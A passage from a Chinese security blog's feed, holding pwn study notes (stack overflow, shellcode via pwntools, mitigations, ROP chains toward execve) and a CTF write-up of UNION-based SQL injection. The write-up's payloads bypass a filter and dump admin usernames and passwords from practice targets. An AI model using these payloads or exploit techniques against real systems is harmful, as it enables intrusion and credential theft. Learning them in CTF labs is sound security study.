        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><blockquote><p>来源：</p><p>[0002.哔哩哔哩-【个人向】CTF pwn 入门-P2<a href="https://www.bilibili.com/video/BV1854y1y7Ro?vd_source=73decf7c030f3abfceb81f802abd8fd0&p=2&spm_id_from=333.788.videopod.episodes">高清版]_哔哩哔哩_bilibili</a></p></blockquote><h1 id="PPT链接"><a href="#PPT链接" class="headerlink" title="PPT链接"></a>PPT链接</h1><p><a href="https://onedrive.live.com/edit.aspx?resid=4465402B41B4B710!seb0e4dd0494f4f52bef5c10a8eed95ec">PWN.pptx - Microsoft PowerPoint Online</a></p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116150330270.png" class title="image-20241116150330270"><h1 id="第一节：可执行文件、ELF文件结构"><a href="#第一节：可执行文件、ELF文件结构" class="headerlink" title="第一节：可执行文件、ELF文件结构"></a>第一节：可执行文件、ELF文件结构</h1><p>探讨从test.c到a.out的过程。研究一下a.out的结构</p><h1 id="第二节：程序装载和运行内存"><a href="#第二节：程序装载和运行内存" class="headerlink" title="第二节：程序装载和运行内存"></a>第二节：程序装载和运行内存</h1><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116150619921.png" class title="image-20241116150619921"><p>节视图是放在磁盘中划分功能的，段视图是程序装载到内存中来划分不同读写权限的。</p><p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/Pwn%E5%AD%A6%E4%B9%A0%5Cimage-20241116151250348.png" alt="image-20241116151250348"></p><p><strong>看图说话：</strong></p><blockquote><p>[IMPORTANT]</p><p><strong>权限相同的节归在一起成了段。</strong></p></blockquote><p>这个<strong>合并</strong>的过程是由 <code>Linker</code> 来完成的</p><p>从ELF文件到虚拟内存空间这个<strong>映射过程</strong>是由操作系统（<code>OS</code>）来完成的    （所以上图仅供Linux参考）</p><p>图中发现，.rodata这个数据节被划分到了Code段中。这是为什么？——只依据权限划分</p><p>可执行程序内容只占了<strong>一部分内存区域</strong>。左边的ELF文件，实际上只有右边的Data和Code两个小长方形。其他是什么后面再说</p><p>地址以字节编码，常以十六进制表示。</p><p>虚拟内存<strong>用户空间</strong>每个进程一份</p><p>虚拟内存<strong>内核空间</strong>所有进程共享一份</p><p>虚拟内存mmap段中的<strong>动态链接库</strong>仅在物理内存中装载一份</p><h5 id="虚拟地址空间（虚拟内存）和物理内存"><a href="#虚拟地址空间（虚拟内存）和物理内存" class="headerlink" title="虚拟地址空间（虚拟内存）和物理内存"></a>虚拟地址空间（虚拟内存）和物理内存</h5><style>.sgbskgqngfik{zoom: 50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116153505516.png" class="sgbskgqngfik" alt="image-20241116153505516"><p>x86-LInux（32位的进程虚拟地址空间）    一共4GB（整个4GB对应内存中的ELF）</p><p>用户空间分3GB，1GB共享内核空间。（节省资源的目的） </p><style>.micunltjmepu{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116154309783.png" class="micunltjmepu" alt="image-20241116154309783"><p>如果是64位进程虚拟地址空间，地址的有效位其实是6个字节。因为这足够大了</p><h5 id="段与节"><a href="#段与节" class="headerlink" title="段与节"></a>段与节</h5><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116231329387.png" class title="image-20241116231329387"><p>text节就是我们的主程序</p><p>一个段是节的<strong>高层次</strong>。</p><p>段视图用于进程的内存区域的rwx<strong>权限划分</strong></p><p>节视图用于ELF文件编译链接时与磁盘上存储的文件结构的组织</p><h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116232159290.png" class title="image-20241116232159290"><p><code>glb</code>作为没有赋初值的全局变量，不占磁盘空间但占由内存空间。储存在Bss中</p><p><code>“Hello World”</code>虽然是一个字符串 常量，但是在<code>Text</code>段中（一般认为这是代码成分）。这是因为它只有可读性，属于Text段中的<code>.rodata</code>节</p><p>函数被编译后还是数据，数据是被用来执行的代码。既然是代码段，所以在Text段。</p><p>函数调用在栈中</p><p>局部变量ptr在栈中</p><p>malloc申请的空间在堆中</p><p>x,y在哪儿与系统架构有关。AMD64在寄存器，x86在栈</p><h1 id="第三节：CPU与进程的执行"><a href="#第三节：CPU与进程的执行" class="headerlink" title="第三节：CPU与进程的执行"></a>第三节：CPU与进程的执行</h1> <img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241116233739080.png" class title="image-20241116233739080"><p>CPU通过总线向内存发送访存指令。</p><h1 id="第四节：装载与汇编"><a href="#第四节：装载与汇编" class="headerlink" title="第四节：装载与汇编"></a>第四节：装载与汇编</h1><p>汇编这个，课堂任务，懒得写</p><p>装载这个，没学会，写不出来</p><h1 id="第五节：栈溢出基础"><a href="#第五节：栈溢出基础" class="headerlink" title="第五节：栈溢出基础"></a>第五节：栈溢出基础</h1><h3 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h3><p>研究的是x86嗷</p><style>.tkltrujmticz{zoom: 67%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117141336080.png" class="tkltrujmticz" alt="image-20241117141336080"><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117141635096.png" alt="image-20241117141635096" style="zoom: 67%;"><style>.ecqdfcdisnyi{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117143029165.png" class="ecqdfcdisnyi" alt="image-20241117143029165"><style>.fcdftssgwocq{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117143135103.png" class="fcdftssgwocq" alt="image-20241117143135103"><style>.difwyuhfojvy{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117143257088.png" class="difwyuhfojvy" alt="image-20241117143257088"><style>.fnwsbcosheta{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117143429165.png" class="fnwsbcosheta" alt="image-20241117143429165"><p>函数状态主要涉及三个寄存器——<code>esp</code>、<code>ebp</code>、<code>eip</code>。</p><p><code>esp</code><strong>用来存储函数调用栈的栈顶地址</strong>，在压栈和退栈的时候发生变化。</p><p><code>ebp</code><strong>用来存储当前函数状态的基地址</strong>，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p><p><code>eip</code><strong>用来存储即将执行的程序指令的地址</strong>，cpu依照eip的存储内容读取指令并执行，eip随之指向相邻的下一条指令。</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241117140052263.png" class title="image-20241117140052263"><p><code>return address</code>：返回地址</p><p><code>stack frame pointer</code>：<strong>上一个栈帧的栈顶</strong>（ebp）的值。方便恢复父函数的栈顶指针</p><p><code>local variables</code>：<strong>局部变量</strong></p><p><code>arguments</code>：子函数所用到的<strong>形参</strong>。 子函数保存的参数实际上在父函数栈帧的末尾。</p><p>能看出来吗，图中的例子是个循环结构</p><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241118100801676.png" class title="image-20241118100801676"><p>试试看能不能在没有讲解的情况下捋完整个过程。</p><p>不行看PPT去</p><p><strong>main函数的栈帧是第一个栈帧，在此之前运行的函数是没有栈帧的</strong></p><h3 id="栈溢出攻击"><a href="#栈溢出攻击" class="headerlink" title="栈溢出攻击"></a>栈溢出攻击</h3><p>要得到shell，就要控制程序的执行流</p><p>要控制程序的执行流，就要控制PC寄存器</p><p>要控制PC寄存器，就要控制能为PC寄存器赋值的数据</p><p>也就是要<strong>控制子函数返回父函数的 return address</strong></p><p>栈溢出是<strong>缓冲区溢出</strong>的一种。</p><p>缓冲区溢出的本质是向<strong>定长的缓冲区</strong>写入了<strong>超长的数据</strong>，造成超出的数据腹泻了合法内存区域</p><p>缓冲区溢出分为<strong>栈溢出</strong>、<strong>堆溢出</strong>和<strong>BSS溢出</strong>三种</p><h5 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h5><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241118103900450.png" class title="image-20241118103900450"><h1 id="第六节：熟练使用工具"><a href="#第六节：熟练使用工具" class="headerlink" title="第六节：熟练使用工具"></a>第六节：熟练使用工具</h1><p>一切的开端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>执行文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;IP&quot;</span>,Port)</span><br></pre></td></tr></table></figure><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241120202629020.png" class title="image-20241120202629020"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recv()//读取全部输出</span><br><span class="line"></span><br><span class="line">io.recvline()//读取一行输出</span><br></pre></td></tr></table></figure><p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/Pwn%E5%AD%A6%E4%B9%A0%5Cimage-20241120202840185.png" alt="image-20241120202840185"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendline(p64<span class="string">&quot;15&quot;</span>)//自带换行。若是<span class="number">32</span>位整数则是p32</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&quot;135asdf\n&quot;</span>)//send只能发送二进制数据。</span><br></pre></td></tr></table></figure><h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>g  跳转到指定地址</p><h5 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h5><p>run 运行</p><p>r</p><p>b （break point）     b main即运行完主函数</p><p>n  进行下一步</p><p>vmmap</p><p>注意gdb是用一种特殊的方式来进行的进程映像，所以gdb的栈地址（很大概率）不一定是可靠的地址。</p><p>但是gdb中看到的偏移一定是可靠的</p><p>相比IDA 中看到的偏移不一定可靠</p><h5 id="机器码"><a href="#机器码" class="headerlink" title="机器码"></a>机器码</h5><p><code>shellcraft</code></p><p><code>shellcraft.sh()</code> 输出汇编代码</p><p><code>print（shellcraft.sh() ）</code>  这是我们要的shellcode</p><p><code>print(asm(shellcraft.sh()))</code> 转化为机器码</p><p>以上是32位</p><p>如是64位</p><p><code>shellcraft.amd64.sh()</code></p><p>不过最好先加上 <code>context.arch = &quot;amd64&quot;</code></p><p>刷题去吧，写题解</p><h1 id="第七节：程序保护措施"><a href="#第七节：程序保护措施" class="headerlink" title="第七节：程序保护措施"></a>第七节：程序保护措施</h1><p>使用checksec查看</p><h4 id="ASLR（Address-Space-Layout-Randomization）"><a href="#ASLR（Address-Space-Layout-Randomization）" class="headerlink" title="ASLR（Address Space Layout Randomization）"></a>ASLR（Address Space Layout Randomization）</h4><p><strong>地址空间随机化</strong>。</p><p>系统的防护措施，程序装载时生效。操作系统默认打开</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>0</strong>：<strong>没有随机化</strong>。即关闭 ASLR</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>1</strong>：<strong>保留的随机化</strong>。共享库、栈、mmap() 以及 VDSO 将被随机化</p><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space &#x3D; <strong>2</strong>：<strong>完全的随机化</strong>。在randomize_va_space &#x3D; 1的基础上，通过 brk() 分配的内存空间也将被随机化</p><h4 id="The-NX-bits-the-No-eXecute-bits"><a href="#The-NX-bits-the-No-eXecute-bits" class="headerlink" title="The NX bits (the No-eXecute bits)"></a>The NX bits (the No-eXecute bits)</h4><p>栈缓冲区不可执行</p><p>只要不应该是代码的地方都不执行</p><p>所以<strong>一般思路将shellcode写入bss</strong>。 写入堆很少。<del>但听说ctf很多</del></p><p><strong>bss是用来存放全局变量的</strong></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>在previous ebp前放了一个canary数组，内容为随机数</p><p>在栈帧销毁时（leave指令前），会检测Canary数组的值是否改变，如果改变程序会寄掉</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>编译器编译时打开的开关，与ASLR区分</p><p>随机化Data，Text和Bss</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241122111607229.png" class title="image-20241122111607229"><p>在脚本头上写下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack -no-pie -g -o ret2stack ret2stack.c</span><br></pre></td></tr></table></figure><p>生成程序后，checksec一下</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241126213339533.png" class title="image-20241126213339533"><h1 id="第八节：返回导向编程"><a href="#第八节：返回导向编程" class="headerlink" title="第八节：返回导向编程"></a>第八节：返回导向编程</h1><p>多次篡改IP成我们想要的地址的过程</p><p>和前面的栈溢出不同的是，以前的基础栈溢出可以一步到位（因为有后门函数或者可以注入shellcode）。而现在无了。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul><li>是操作系统提供给用户的编程接口，这些接口可以被链接库封装成一个函数。</li><li>是<strong>提供访问操作系统所管理的底层硬件的接口</strong></li><li>本质上是一些内核（Kernel）函数代码，以规范的方法驱动硬件</li><li>x86通过int 0x80指令进行系统调用、amd64通过syscall指令进行系统调用</li></ul><p>举例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">my_puts</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, shellcode, <span class="number">0x100</span>); <span class="comment">//这个write其实是动态链接库帮忙封装好的函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样一个代码，在<strong>操作系统层面</strong>是如何实现的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov eax, xx</span><br><span class="line"></span><br><span class="line">mov ebx, xx;赋值要输出的东东</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>什么是动态链接库？</p><p>使用<code>ldd</code>指令可以看到使用到的所有链接库</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241126221633861.png" class title="image-20241126221633861"><p>最下面的那东西，把我们所需要的所有动态链接库，文件，全部<strong>装载到shared library</strong>中。</p><p>我们要关注的是<code>libc.so</code>。这是一个<strong>软链接</strong>，不是一个具体的实现。</p><p><strong>什么是软链接？</strong></p><p>这好比我们的快捷方式。不管这个应用程序发生了什么样的改变，只要位置没变，这个快捷方式就可以打开这个应用程序。相比之，动态链接库也是在不断更新的，libc.so就充当了这个代名人。</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241126222805442.png" class title="image-20241126222805442"><p>这里没绑定动态链接库啊。</p><p>如果绑定了就可以直接执行，相当于直接执行这个动态链接库</p><p>简而言之，<strong>动态链接库就是存放在lib目录的一些可执行文件</strong>而已，这些库里面已经包含了大量的已经写好的C语言代码（伟大，无需多言）。</p><p>而<strong>软链接就是动态链接库的一个快捷方式</strong></p><p>同样看上面那个write的例子，在执行程序的时候，执行流为：</p><p><code>my_puts()</code>&#x3D;&#x3D;&gt;<code>write()</code>&#x3D;&#x3D;&gt;<code>sys_write()</code></p><p>从<strong>Text</strong>到<strong>shared library</strong>再到<strong>Kernel</strong></p><p>各个函数都有对应的系统调用号，如write的系统调用号是4 。write函数是对sys_write这样一个系统调用的一个封装</p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><h5 id="一个重要的系统调用"><a href="#一个重要的系统调用" class="headerlink" title="一个重要的系统调用"></a>一个重要的系统调用</h5><p><code>execve</code></p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241126224956779.png" class title="image-20241126224956779"> <p>分析系统调用的过程：</p><p>首先赋值一个<strong>系统调用号</strong>（<strong>eax</strong>）    （execev的系统调用号是11）</p><p><strong>ebx，ecx，edx保存系统调用的参数</strong></p><p>int（interrupt）中断，<strong>0x80代表的就是系统调用</strong></p><p>所以我们首先知道这是一个系统调用，然后查看系统调用号看看这是哪个系统调用，最后传递参数执行</p><p>只需要这几条汇编代码就可以得到shell，但现实往往不会白白将这些代码连续得写到程序中。</p><p>不过，有这些程序片段也是可以的。</p><p>这就是<strong>ROP</strong></p><p><strong>让分离的代码连续执行，达到对应的效果</strong></p><style>.iiddtcjrydtw{zoom:67%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241127094818640.png" class="iiddtcjrydtw" alt="image-20241127094818640"><p>左边是程序执行的过程。原来的基础栈溢出只需要返回到后门函数或是某一个特定位置就可以了。</p><p>如今这个返回地址是一个<strong>链状</strong>的结构如今要执行四个不同片段（<strong>gadget</strong>）的代码，所以要跳转四次。</p><p>这个<strong>gadget</strong>就是这种，先pop（或mov，lea）一个数据给到寄存器，再ret的函数</p><p>不过pop比较好用。原因esp可以自动向上移，指向下一个IP地址。</p><p>（这个还真像链表，数据成员作为函数参数，指针成员指向下一个执行的地址）</p><style>.wujdjveizhhk{zoom:50%;}</style><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241127190339914.png" class="wujdjveizhhk" alt="image-20241127190339914"> <p>payload就像是一个个gadget搭起来的拼图</p><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>使用这个工具可以找到需要的指令以及它的地址</p><p>即找到我们的gadget</p><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot;</code></p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241127185035223.png" class title="image-20241127185035223"> <p>非常de好用</p><h5 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h5><p>gadget是mov，ret或是pop ，ret都可以。只要最后有个ret就可以无限执行下去。</p><p>因为ret可以<strong>改变程序的执行流</strong>（IP ）。我们只需要将一系列返回地址或者数据溢出到栈中，就可以不断跳跃在各个gadget中。</p><ol><li>栈溢出，让返回地址第一个gadget</li></ol><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241128141239882.png" class title="image-20241128141239882"><ol start="2"><li>执行第一个gadget。将esp指向的元素赋值给edx，esp自增指向新的返回地址</li></ol><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241128141455136.png" class title="image-20241128141455136"><ol start="3"><li>执行第二个gadget。将eax清空，返回esp所指向的地址</li></ol><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/11/16/Pwn%E5%AD%A6%E4%B9%A0/image-20241128141630872.png" class title="image-20241128141630872"><p>最终执行过程就像这样</p><img src="/2024/11/16/Pwn%E5%AD%A6%E4%B9%A0/Users\czh\myblog\source\_posts\Pwn学习\image-20241128143137143.png" alt="image-20241128143137143" style="zoom:67%;"> <p>在栈中溢出一系列的返回地址，链式执行一系列的gadget。最后执行int 0x80指令，成功执行系统调用。这样就达到了攻击的目的。</p><p>图中最后从Text段到Kernel中执行的系统调用。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF中SQL注入writeup</title>
      <link href="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/"/>
      <url>/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h2><ol><li><h5 id="判断闭合方式为-’（单引号）"><a href="#判断闭合方式为-’（单引号）" class="headerlink" title="判断闭合方式为 ’（单引号）"></a>判断闭合方式为 <code>’</code>（单引号）</h5></li><li><h5 id="爆字段数，以成功联合注入"><a href="#爆字段数，以成功联合注入" class="headerlink" title="爆字段数，以成功联合注入"></a>爆字段数，以成功联合注入</h5></li></ol><p>​<code>?id=1&#39; order by 1 --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-1.png" class title="1-1"><p>​发现有WAF，这里使用大写绕过</p><p>​<code>?id=1&#39; Order by 1 --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-2.png" class title="1-2"><p>​一直尝试直到<code>?id=1&#39; Order by 6 --+</code>没有回显，说明字段数为5</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-3.png" class title="1-3"><ol start="3"><li><h5 id="联合注入爆数据库名"><a href="#联合注入爆数据库名" class="headerlink" title="联合注入爆数据库名"></a>联合注入爆数据库名</h5></li></ol><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-4.png" class title="1-4"><p>​可见，数据库名就是ctf</p><p>​到这里答案就是到手的鸭子了</p><ol start="4"><li><h5 id="顺藤摸瓜，找到表名"><a href="#顺藤摸瓜，找到表名" class="headerlink" title="顺藤摸瓜，找到表名"></a>顺藤摸瓜，找到表名</h5></li></ol><p><code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA =&#39;ctf&#39; --+</code></p><p>​<img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-5.png" class title="1-5"></p><p>​显然flag在here_is_flag这个表中，但我们先要找到在哪个字段下（当然一般可以直接猜出来字段名为flag）</p><ol start="5"><li><h5 id="再找到字段名"><a href="#再找到字段名" class="headerlink" title="再找到字段名"></a>再找到字段名</h5></li></ol><p>​<code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =&#39;here_is_flag&#39; --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-6.png" class title="1-6"><ol start="6"><li><h5 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h5></li></ol><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/1-7.png" class title="1-7"><p>​大功告成</p><hr><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>点进去发现有两个模块，一个新闻页面，一个登录页面。</p><ol><li><h5 id="找到注入位置"><a href="#找到注入位置" class="headerlink" title="找到注入位置"></a>找到注入位置</h5></li></ol><p>点开热点中的热点一，发现这里有一个php请求，猜测是否这里有sql注入（为什么呢）</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-1.png" class title="2-1"><ol start="2"><li><h5 id="开始注入（公式化）"><a href="#开始注入（公式化）" class="headerlink" title="开始注入（公式化）"></a>开始注入（公式化）</h5></li></ol><p>爆字段数</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-2.png" class title="2-2"><p>爆库名</p><p><code>?id=-1 union select 1,database() --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-3.png" class title="2-3"><p>爆表名</p><p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39; --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-4.png" class title="2-4"><p>爆字段名</p><p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39; --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-5.png" class title="2-5"><p>爆字段值</p><p><code>?id=-1 union select 1,group_concat(username,&#39;,&#39;,password) from news.admin --+</code></p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-6.png" class title="2-6"><p>得到账号密码后就去登录吧</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-7.png" class title="2-7"><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/2-8.png" class title="2-8"><p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p><hr><h2 id="CTF-BugKu-sqli-0x1"><a href="#CTF-BugKu-sqli-0x1" class="headerlink" title="CTF-BugKu-sqli-0x1"></a>CTF-BugKu-sqli-0x1</h2><p><a href="https://blog.csdn.net/weixin_73625393/article/details/137773172">https://blog.csdn.net/weixin_73625393/article/details/137773172</a></p><p><a href="http://danielw.top/index.php/daniel/340/">http://danielw.top/index.php/daniel/340/</a></p><p>没有变化，使用的是POST传参</p><img src="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/image-20241115233313019.png" class 